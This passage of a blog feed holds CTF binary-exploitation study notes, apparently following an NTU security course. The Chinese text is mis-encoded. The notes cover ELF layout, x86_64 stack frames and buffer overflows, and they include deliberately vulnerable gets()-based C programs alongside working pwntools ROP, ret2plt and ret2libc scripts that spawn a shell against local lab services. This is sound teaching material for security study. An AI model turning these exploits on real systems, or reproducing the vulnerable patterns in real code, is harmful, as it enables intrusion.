syscall</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/Skzc8vZuC.png"                      alt="æˆªåœ– 2024-07-14 22.53.56"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/r1J3iQmCT.png"                      alt="image"                ></p><ul><li><code>ox601000</code> input in rdi</li><li><code>&#39;/bin/sh\0&#39;</code> input in rsi</li><li><code>mov qword ptr [rdi], rsi</code> mov rsi to <strong>rdi pointer</strong> memory space<br>â€¦</li></ul><h3 id="ç¸½çµ"><a href="#ç¸½çµ" class="headerlink" title="ç¸½çµ"></a>ç¸½çµ</h3><ul><li>Overflow control rip å¾Œ</li><li><strong>NX Off</strong> çš„å‰æä¸‹å¯æ’°å¯«shellcode <code>execve(&quot;/bin/sh&quot;,0,0)</code>ç›´æ¥åŸ·è¡Œ</li><li><strong>NX On</strong> æ™‚é€é ROP æ¨ç–Šå‡ºåŸ·è¡Œ <code>execve(&quot;/bin/sh&quot;,0,0)</code> è¡Œç‚ºçš„ ROP chain</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attack = !NX ? shellcode : ROP</span><br></pre></td></tr></table></figure></div><h3 id="DEMO"><a href="#DEMO" class="headerlink" title="DEMO"></a>DEMO</h3><blockquote><p>rop.c</p></blockquote><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdout,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdin,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stderr,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>( <span class="string">&quot;Say hello to stack :D&quot;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>];</span><br><span class="line">    <span class="built_in">gets</span>( buf );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>Compile</p><blockquote><p><code>gcc src/rop.c -o ./rop/share/rop -no-pie -fno-stack-protector --static</code><br><code>--static</code>: æ–¹ä¾¿ç·´ç¿’</p></blockquote></blockquote><h4 id="è§£æ³•"><a href="#è§£æ³•" class="headerlink" title="è§£æ³•"></a>è§£æ³•</h4><ol><li><code>ROPgadgget --binary ./rop</code> ,æ‰¾å‡ºä½ è¦çš„ gadget</li><li><code>gdb vmmap</code> æ‰¾å¯å¯«ä½ç½®</li><li><ul><li><code>pop rax;0x3b;syscall;</code>  : <code>sys_execve(%rdi,%rsi,%rdx)</code></li></ul></li><li><ul><li>%rdx : 0</li><li>%rdi : <code>bss</code> , pointer to memory space</li><li>%rsi : <code>mov [rdi], rsi</code> ; â€œ&#x2F;bin&#x2F;sh\0â€, 0</li></ul></li></ol><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">y = remote( <span class="string">&#x27;localhost&#x27;</span> , <span class="number">10173</span> )</span><br><span class="line"><span class="comment">#y = process( &#x27;../rop/share/rop&#x27; )</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x0000000000415714</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400686</span></span><br><span class="line">pop_rsi = <span class="number">0x00000000004100f3</span></span><br><span class="line">pop_rdx = <span class="number">0x0000000000449935</span></span><br><span class="line">mov_q_rdi_rsi = <span class="number">0x000000000044709b</span> <span class="comment"># mov qword ptr [rdi], rsi ; ret</span></span><br><span class="line">syscall = <span class="number">0x000000000047b68f</span></span><br><span class="line"></span><br><span class="line">pop_rdx_rsi = <span class="number">0x000000000044beb9</span></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x6b6030</span></span><br><span class="line"></span><br><span class="line">p = flat(</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span> * <span class="number">0x38</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    bss,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    <span class="string">&#x27;/bin/sh\0&#x27;</span>,</span><br><span class="line">    mov_q_rdi_rsi,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    pop_rdx,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    pop_rax,</span><br><span class="line">    <span class="number">0x3b</span>,</span><br><span class="line">    syscall</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">y.sendlineafter( <span class="string">&#x27;:D&#x27;</span> , p )</span><br><span class="line"></span><br><span class="line">y.sendline( <span class="string">&#x27;cat /home/`whoami`/flag&#x27;</span> )</span><br><span class="line"></span><br><span class="line">y.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="ret2plt"><a href="#ret2plt" class="headerlink" title="ret2plt"></a>ret2plt</h2><blockquote><p>Return to .plt</p></blockquote><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/rJ5GPOWd0.png"                      alt="æˆªåœ– 2024-07-15 00.04.25"                ></p><blockquote><p>æ‰¾åˆ°plt function çš„ä½ç½®å°±å¯ä»¥ç›´æ¥call</p></blockquote><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/BJbFSUMOA.png"                      alt="æˆªåœ– 2024-07-15 15.53.23"                ></p><ul><li>å¯ä»¥ç›´æ¥å–ä»£rop chain(ğŸ‘†) çš„ä¸€é•·ä¸²<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/Sy2nrIGOR.png"                      alt="æˆªåœ– 2024-07-15 15.54.24"                ></li><li>system<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/rkk7HOGdC.png"                      alt="æˆªåœ– 2024-07-15 18.08.18"                ></li></ul><br><h3 id="DEMO-1"><a href="#DEMO-1" class="headerlink" title="DEMO"></a>DEMO</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    init();</span><br><span class="line"></span><br><span class="line">    system( <span class="string">&quot;echo &#x27;Say hello to stack :D&#x27;&quot;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>];</span><br><span class="line">    gets( buf );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Sol"><a href="#Sol" class="headerlink" title="Sol"></a>Sol</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">y = remote( <span class="string">&#x27;localhost&#x27;</span> , <span class="number">10174</span> )</span><br><span class="line"><span class="comment">#y = process( &#x27;../ret2plt/share/ret2plt&#x27; )</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400733</span></span><br><span class="line"></span><br><span class="line">gets_plt = <span class="number">0x400530</span></span><br><span class="line">system_plt = <span class="number">0x400520</span></span><br><span class="line">bss = <span class="number">0x601070</span></span><br><span class="line"></span><br><span class="line">p = flat(</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span> * <span class="number">0x38</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    bss,</span><br><span class="line">    gets_plt,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    bss,</span><br><span class="line">    system_plt</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">y.sendlineafter( <span class="string">&#x27;:D&#x27;</span> , p )</span><br><span class="line"></span><br><span class="line">y.sendline( <span class="string">&#x27;sh&#x27;</span> )</span><br><span class="line"></span><br><span class="line">y.sendline( <span class="string">&#x27;cat /home/`whoami`/flag&#x27;</span> )</span><br><span class="line"></span><br><span class="line">y.interactive()</span><br></pre></td></tr></table></figure></div><h3 id="Conculsion"><a href="#Conculsion" class="headerlink" title="Conculsion"></a>Conculsion</h3><p>In the condition that without pie , cross ASLR to use lib function.</p><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><blockquote><p>Bypass ASLR - èƒ½leakå°±çµæŸäº†</p></blockquote><ul><li>Function .got table -&gt; <strong>lib address</strong></li><li><code>leaked_address - offset = base_address</code></li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/ry_2G3fdR.png"                      alt="æˆªåœ– 2024-07-15 22.31.08"                ></p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><ul><li>å†ä¸€æ¬¡çš„é€£ç·šä¸­ï¼Œéœ€è¦åŒæ™‚leakå’Œexpolit</li><li><code>objdump -R &lt;binary&gt;</code> : æ‰¾ libc_start_main</li><li><code>readelf -s &lt;binary&gt;</code> : æ‰¾ offset</li><li>leak å®Œæˆï¼Œè·³å›mainå†å‡ºç™¼ overflow</li><li>å¯ä»¥å¾binaryä¸­æœå°‹<code>&quot;/bin/sh&quot;</code> : <code>print &#39;&quot;/bin/sh&quot; str :&#39; , hex( l.search( &#39;/bin/sh&#39; ).next() )</code></li><li>å¯èƒ½æœƒcrashï¼Œå› ç‚ºéœ€è¦8byteså°é½Šï¼šå†åŠ ä¸Šretå°±å¯è§£æ±º</li></ul><h4 id="â€œ-bin-shâ€-çš„å¯«å…¥"><a href="#â€œ-bin-shâ€-çš„å¯«å…¥" class="headerlink" title="â€œ&#x2F;bin&#x2F;shâ€ çš„å¯«å…¥"></a>â€œ&#x2F;bin&#x2F;shâ€ çš„å¯«å…¥</h4><ol><li>ä½¿ç”¨ret2plt call <code>gets()</code> å¯«å…¥</li><li>pwntools lib.search</li></ol><h2 id="information-leaking"><a href="#information-leaking" class="headerlink" title="information leaking"></a>information leaking</h2><ul><li>array å¯«å‡ºä¸€å€‹å€åŸŸä¸¦ä¸æœƒæŠŠå…§å®¹æ¸…æ‰</li><li>ä½¿ç”¨leak_addresså’Œoffsetå°±å¯ä»¥çŸ¥é“ base_address</li></ul><h3 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack pivoting"></a>stack pivoting</h3><blockquote><p>stack migartion</p></blockquote><ul><li>leave ; ret<ul><li>Overflow æ™‚å°‡ <strong>rbp</strong> å¡«æˆ ROP Chain çš„ <code>address -8</code></li><li>return address th leave; ret gadget</li><li>pop rsp; ret</li><li>æ‰‹å‹•æ‰¾é‡å°å„ç¨®ç•¶ä¸‹æƒ…æ³çš„ gadget</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Yuawn bof WriteUp</title>
      <link href="/2024/08/05/pwn-1/"/>
      <url>/2024/08/05/pwn-1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>From <code>yuawn</code> <a class="link"   href="https://github.com/yuawn/NTU-Computer-Security" >NTU-Computer-Security <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><ul><li><a class="link"   href="https://hackmd.io/nFewizI_T7GcNPKGDwVKTQ" >Dkoctro <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul><ul><li><input checked="" disabled="" type="checkbox"> week1</li><li><input disabled="" type="checkbox"> week2</li><li><input disabled="" type="checkbox"> week3</li><li><input disabled="" type="checkbox"> PicoCTF.com</li><li><input disabled="" type="checkbox"> <a class="link"   href="https://pwn.college/" >pwn.college <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><input disabled="" type="checkbox"> Pwnable.tw</li></ul><br><h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><h3 id="ELF-Executable-and-Linkable-Format"><a href="#ELF-Executable-and-Linkable-Format" class="headerlink" title="ELF (Executable and Linkable Format)"></a>ELF (Executable and Linkable Format)</h3><p><strong>INTRO</strong><br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/HJ-AkIhHp.png"                      alt="image"                ></p><p><strong>ELF-workflow (static)</strong><br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/B1bbxL3BT.png"                      alt="image"                ></p><p><strong>ELF-workflow (static)</strong><br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/ByEfeI2rT.png"                      alt="image"                ></p><p><strong>ElF-section</strong><br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/B1WKkIhH6.png"                      alt="image"                ></p><p><strong>ELF-Protections</strong><br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/BJdLlU3HT.png"                      alt="image"                ></p><br/><h3 id="ELF-DEMO"><a href="#ELF-DEMO" class="headerlink" title="ELF DEMO"></a>ELF DEMO</h3><h4 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a>readelf</h4><ul><li>Install <a class="link"   href="https://github.com/longld/peda" >peda <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">int a;</span><br><span class="line">int b = 100;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int c;</span><br><span class="line">    puts(&quot;I love pwning.&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">all: elf.c</span></span><br><span class="line">        gcc elf.c -o elf -no-pie</span><br></pre></td></tr></table></figure></div><ul><li>readelf <code>offset</code></li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$readelf</span> -S elf</span><br><span class="line"></span><br><span class="line">        |addr                    | offset |</span><br><span class="line">| .data |0x0000000000404008      | 3008   |</span><br><span class="line">| .bss  |0x00000000040401c       | 301c   |</span><br><span class="line"></span><br><span class="line">$ (gdb) x/30 0x0000000000404008</span><br><span class="line">    &lt;b&gt;  0x0000000000000064</span><br><span class="line"></span><br><span class="line"><span class="variable">$xxd</span> elf</span><br></pre></td></tr></table></figure></div><ul><li>readelf<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/Bkr45M0Hp.png"                      alt="image"                ></li><li>xxd<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/S1RGOzCra.png"                      alt="image"                ></li></ul><h4 id="Check-file-size"><a href="#Check-file-size" class="headerlink" title="Check file size"></a>Check file size</h4><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> b = <span class="number">100</span>;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> c;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;I love pwning.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>size<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/B12E0fCB6.png"                      alt="image"                ></li></ul><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> b = <span class="number">100</span>;</span><br><span class="line"><span class="type">char</span> buffer[<span class="number">0x400</span>*<span class="number">0x400</span>*<span class="number">10</span>]=&#123;<span class="string">&#x27;A&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> c;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;I love pwning.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>File size: 11M<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/H1Ur0GCHa.png"                      alt="image"                ></li></ul><h4 id="Offset-and-address"><a href="#Offset-and-address" class="headerlink" title="Offset and address"></a>Offset and address</h4><ul><li><code>Addressï¼ˆåœ°å€ï¼‰</code>ï¼š é€™æ˜¯æŒ‡ ELF æª”æ¡ˆåœ¨è¨˜æ†¶é«”ä¸­çš„åŠ è¼‰ä½ç½®ã€‚åŸ·è¡Œ ELF æ™‚ï¼Œä½œæ¥­ç³»çµ±å°‡æª”æ¡ˆçš„ä¸åŒ section åŠ è¼‰ (mapping) åˆ°è¨˜æ†¶é«”çš„ä¸åŒä½ç½®ã€‚æ¯å€‹ section çš„ â€œAddressâ€ å°±æ˜¯åœ¨è¨˜æ†¶é«”ä¸­çš„å¯¦éš›ä½ç½®ã€‚</li><li><code>Offsetï¼ˆåç§»é‡ï¼‰</code>ï¼š æŒ‡ ELF ä¸­ section åœ¨æª”æ¡ˆæœ¬èº«çš„åç§»ä½ç½®ã€‚æ¯å€‹ section çš„ â€œOffsetâ€ å°±æ˜¯æŒ‡è©² section åœ¨ ELF æª”æ¡ˆä¸­çš„ä½ç½®ï¼Œä»¥å­—ç¯€ç‚ºå–®ä½ã€‚</li></ul><blockquote><p>â€œAddressâ€ æ˜¯åŠ è¼‰åˆ°è¨˜æ†¶é«”æ™‚çš„ä½ç½®ï¼Œè€Œ â€œOffsetâ€ æ˜¯åœ¨æª”æ¡ˆä¸­çš„ä½ç½®ã€‚<br>é€™å…©è€…ä¹‹é–“çš„é—œè¯å¯ä»¥é€šé ELF æª”æ¡ˆçš„ <strong>section è¡¨æ ¼</strong>é€²è¡Œç†è§£ã€‚</p></blockquote><br><h2 id="x86-64"><a href="#x86-64" class="headerlink" title="x86_64"></a>x86_64</h2><ul><li><strong>8 byte alignment (å°é½Š)</strong></li><li>Stack <code>0x10</code> bytes</li></ul><h3 id="Assembly-Registers"><a href="#Assembly-Registers" class="headerlink" title="Assembly Registers"></a>Assembly Registers</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/HJD7d0-Dp.png"                      alt="image"                ></p><h3 id="Special-Registers"><a href="#Special-Registers" class="headerlink" title="Special Registers"></a>Special Registers</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/B1yrdC-wa.png"                      alt="image"                ></p><h3 id="Instruction"><a href="#Instruction" class="headerlink" title="Instruction"></a>Instruction</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/SyBRu0-Pa.png"                      alt="image"                > </p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/B1nkF0-D6.png"                      alt="image"                ></p><h3 id="x64-calling-convention"><a href="#x64-calling-convention" class="headerlink" title="x64 calling convention"></a>x64 calling convention</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/HJjXtRbPT.png"                      alt="image"                ></p><h2 id="Stack-Frame"><a href="#Stack-Frame" class="headerlink" title="Stack Frame"></a>Stack Frame</h2><h3 id="Stack-Struct"><a href="#Stack-Struct" class="headerlink" title="Stack Struct"></a>Stack Struct</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/B1O2qC-wa.png"                      alt="image"                ></p><p><strong>å¾€ä½åœ°å€æ‰¾</strong></p><ul><li><code>push</code> : rsp-0x8 </li><li><code>pop</code> : rsp+0x8</li></ul><br><h2 id="Function-Prologue-Epilogue"><a href="#Function-Prologue-Epilogue" class="headerlink" title="Function Prologue &amp; Epilogue"></a>Function Prologue &amp; Epilogue</h2><h3 id="Prologue"><a href="#Prologue" class="headerlink" title="Prologue"></a>Prologue</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/Byt_YyE96.png"                      alt="image"                ></p><ul><li><strong>call func</strong> &#x3D; <code>push next-rip</code> <code>jmp func</code></li><li><code>mov eax,0</code> <code>push</code> <strong>func allcation</strong> in RAM</li><li><strong>rip -&gt;</strong> <code>func : push rbp</code> <code>##save rbp</code></li><li><code>mov rbp,rsp</code><br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/H16_6k4cT.png"                      alt="image"                ></li><li><code>sub rsp,0x70</code> <strong>0x70 compiler æ±ºå®š &gt;&gt;</strong> <code>To store local variable</code><br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/HJckngNcT.png"                      alt="image"                ></li><li><strong>Prologue finish</strong><br/></li></ul><h3 id="Epilogue"><a href="#Epilogue" class="headerlink" title="Epilogue"></a>Epilogue</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/ry1KMlNc6.png"                      alt="image"                ></p><ul><li><strong>leave</strong> &#x3D; <code>mov rsp,rbp</code> <code>pop rbp</code></li><li><code>pop rbp</code> <strong>-&gt; get</strong> <code>saved rbp</code> <strong>segment.</strong></li><li><strong>ret</strong> &#x3D; <code>pop rip</code></li><li><strong>epilogue finish</strong></li><li><code>rip</code> <strong>Back to next</strong><br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/rJEyce4q6.png"                      alt="image"                ></li></ul><br><br><h1 id="Advanced"><a href="#Advanced" class="headerlink" title="Advanced"></a>Advanced</h1><h2 id="Overflow"><a href="#Overflow" class="headerlink" title="Overflow"></a>Overflow</h2><ul><li>Buffer overflow</li><li>Stack overflow</li><li>Heap overflow</li></ul><h3 id="Buffer-Overflow"><a href="#Buffer-Overflow" class="headerlink" title="Buffer Overflow"></a>Buffer Overflow</h3><p><code>Hijack return address , control rip.</code></p><ul><li><code>bof.c</code><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><figcaption><span>bof.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">call_me</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&#x27;sh&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 